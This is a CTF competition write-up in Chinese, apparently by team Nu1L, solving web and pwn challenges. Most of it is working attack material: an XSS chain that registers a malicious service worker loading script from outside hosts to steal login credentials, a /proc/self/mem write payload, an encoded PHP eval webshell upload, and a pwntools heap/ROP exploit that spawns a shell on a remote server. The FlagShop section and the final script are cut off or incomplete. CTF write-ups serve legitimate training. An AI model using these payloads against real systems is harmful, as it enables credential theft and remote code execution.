西湖论剑 WP-Nu1L 
WEB 
HardXSS 
网站就 dns 爆破 + 提交 xss + 管理员登录三个功能, 用了两个域名`xss.xss.` , `auth.xss.` 
题目有句话 `我收到邮件后会先点开链接然后登录我的网站！` , 这么一看这个题应该是需要作
一个 xss 持久化的. xss 持久化就两种方式 serviceworker, 和 cache. cache 在这个题目里面没
法控制, 所以就得 serviceworker. 要用 serviceworker 就得找一个能 xss 的点, 去注册这个
serviceworker. 
这里我们看代码发现一个 jsonp, 而且没有过滤, 于是就用这个路由做 xss, 代码就不分析了, 
反正就是调用 jsonp 没过滤, 后面也要用到. 
https://xss.xss.eec5b2.challenge.gcsis.cn/login?callback=eval(atob(lala))//&lala=YWxlc
nQoMSk%3d 
因为登录用到的用户名密码是传输到了 auth.xss.这个域名, 如果要注册 serviceworker, 需要
serviceworker 的 js 在 auth.xss.这个域名下, 也就是需要这个域名下的一个可控的点去放
serviceworker 的 js. 也就是我们上面发现的 jsonp 的这个点 
https://auth.xss.eec5b2.challenge.gcsis.cn/api/loginStatus?callback=50chars 
这里有 50 个字符的限制, 但是我们可以把真实的 payload 放到我们服务器上, 让
serviceworker 去 import 
第一个 js 
navigator.serviceWorker.register("https://auth.xss.eec5b2.challenge.gcsis.cn/api/loginS
tatus?callback=importScripts('//d7cb7b72.y7z.xyz/xhlj2.js');//") 
第二个 js 
self.addEventListener('fetch', function (event) {   
    var url = event.request.clone(); 
    body = 
''; 
    init = {headers: { 'Content-Type': 'text/html' }}; 
    if(url.url.startsWith('https://auth.xss.eec5b2.challenge.gcsis.cn/api/loginVerify')){ 
        res  = new Response(body,init); 
        event.respondWith(res.clone()); 
    } 
}); 
最后一个问题就是 serviceworker 在注册的时候必须是同源的页面才能注册上 
访问 auth.xss.这个域名, 可以看到在主页上有一个 document.domain="xss."的一个操作. 
那么就可以联想到跨域的操作里面有一个就是利用 document.domain 和 iframe 去做的. 那
么我们就可以利用之前找到的 xss 去实现这个操作. 
https://xss.xss.eec5b2.challenge.gcsis.cn/login?callback=eval(atob(lala))//&lala=ZG9jd
W1lbnQuZG9tYWluID0gInhzcy5lZWM1YjIuY2hhbGxlbmdlLmdjc2lzLmNuIjsKaWZyYW
1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7CmlmcmFtZS5zcmM9Im
h0dHBzOi8vYXV0aC54c3MuZWVjNWIyLmNoYWxsZW5nZS5nY3Npcy5jbiI7CiQoJ2JvZ
HknKS5hcHBlbmQoaWZyYW1lKTsKaWZyYW1lLm9ubG9hZCA9IGZ1bmN0aW9uKCkge
wogICAgZG9jID0gaWZyYW1lLmNvbnRlbnREb2N1bWVudDsKICAgIHNjciA9IGRvYy5jc
mVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgIHNjci5zcmM9Imh0dHBzOi8vbWh6LnB3L
zJkIjsKICAgIGRvYy5ib2R5LmFwcGVuZChzY3IpOwp9 
document.domain = "xss.eec5b2.challenge.gcsis.cn"; 
iframe = document.createElement("iframe"); 
iframe.src="https://auth.xss.eec5b2.challenge.gcsis.cn"; 
$('body').append(iframe); 
iframe.onload = function() { 
doc = iframe.contentDocument; 
scr = doc.createElement("script"); 
scr.src="https://mhz.pw/2d"; // 加载 serviceworker 
doc.body.append(scr); 
} 
这样我们就在 auth.xss.的那个页面上注册了我们的 serviceworker, 之后再有 get 请求的时候
我们可以通过 serviceworker 的 js 去捕获到这个链接, 然后就拿到了用户名密码. 
登录上去就是 flag.  
FlagShop 
任意文件读取 
view-source:http://shop.65160a.challenge.gcsis.cn/sandbox/64fc54bc-b221-44cd-
938e-a562bdb28695/backend.php?readfile=backend.php 
源码如下： 
%20/tmp/vvvvv"&writefile=/proc/self/mem&offset=15333784&
buffer=%90e%F8%F5%FF%7F%00%00&writefile=/proc/self/mem&offset=15333784&
buffer=%90e%F8%F5%FF%7F%00%00 
EasyJson 
http://easyjson.f7f8eb.challenge.gcsis.cn/?source=12&action=write&filename=f.php 
{"\u0063\u006f\u006e\u0074\u0065\u006e\u0074":"\u003C\u003F\u0070\u0068\u00
70\u0020\u0040\u0065\u0076\u0061\u006C\u0028\u0024\u005F\u0050\u004F\u005
3\u0054\u005B\u0031\u005D\u0029\u003B\u003F\u003E"} 
PWN 
mmutag 
from pwn import * 
p = process('./mmutag') 
p = remote('183.129.189.62',57004) 
libc = ELF('./libc.so.6') 
p.recvuntil('name') 
p.sendline('aaa') 
p.recvuntil('choice') 
p.sendline('2') 
p.recvuntil('choise') 
p.sendline('3') 
p.send('aaaaaaa\n') 
p.recvuntil('aaaaaaa\n') 
addr = u64(p.recv(6).ljust(8,'\x00')) 
print hex(addr) 
p.recvuntil('choise') 
p.sendline('3') 
p.send('a'*0x18+'\n') 
p.recvuntil('a'*0x18+'\n') 
canary = '\x00'+p.recv(7) 
print hex(u64(canary)) 
p.recvuntil('choise') 
p.sendline('3') 
p.send(p64(0x71)*2+p64(0)+canary) 
def add(idx,mess): 
p.recvuntil('choise:') 
p.sendline('1') 
p.recvuntil('id') 
p.sendline(str(idx)) 
p.recvuntil('content') 
p.send(mess) 
def dele(idx): 
p.recvuntil('choise:') 
p.sendline('2') 
p.recvuntil('id') 
p.sendline(str(idx)) 
add(1,'aaaa\n') 
add(2,'bbbb\n') 
add(3,'cccc\n') 
dele(1) 
dele(2) 
dele(1) 
target = addr-0x20 
add(4,p64(target)+'\n') 
add(5,p64(target)+'\n') 
add(6,p64(target)+'\n') 
pop_rdi = 0x0000000000400d23 
pop_rsi_r15=0x0000000000400d21 
rop 
= 
p64(0x71)+canary+p64(0xdeadbeef)+p64(pop_rdi)+p64(0x602018)+p64(0x4006B0)+p64(pop_rdi)+p64(0)
+p64(pop_rsi_r15)+p64(0x000602058)+p64(0)+p64(0x4006F0)+p64(0x0400BF1) 
add(7,rop) 
p.recvuntil('choise:\n') 
raw_input() 
p.sendline('4') 
addr = u64(p.recv(6).ljust(8,'\x00')) 
print hex(addr) 
libc_base = addr-( 0x7f4033b2b540-0x7f4033aa7000) 
system = libc_base+libc.sym['system'] 
p.sendline(p64(system)) 
p.recvuntil('name') 
p.sendline('sh') 
p.recvuntil('choice') 
p.sendline('sh') 
p.interactive() 
ezhttp 
from pwn import * 
#p = process('ezhttp') 
p = remote('183.129.189.62',62102) 
def http_req(method, url, payload=None): 
req = '%s %s HTTP/1.1\n' % (method, url) 
if (method == 'POST' and payload != None): 
req += 'Content-Type: application/json\n' 
req += 'Content-Length: %d\n' % len(payload) 
req += 'Connection: Keep-Alive\n' 
req += 'Cookie: user=admin\n' 
req += 'token: \r\n\r\n' 
req += '%s\n' % payload 
else: 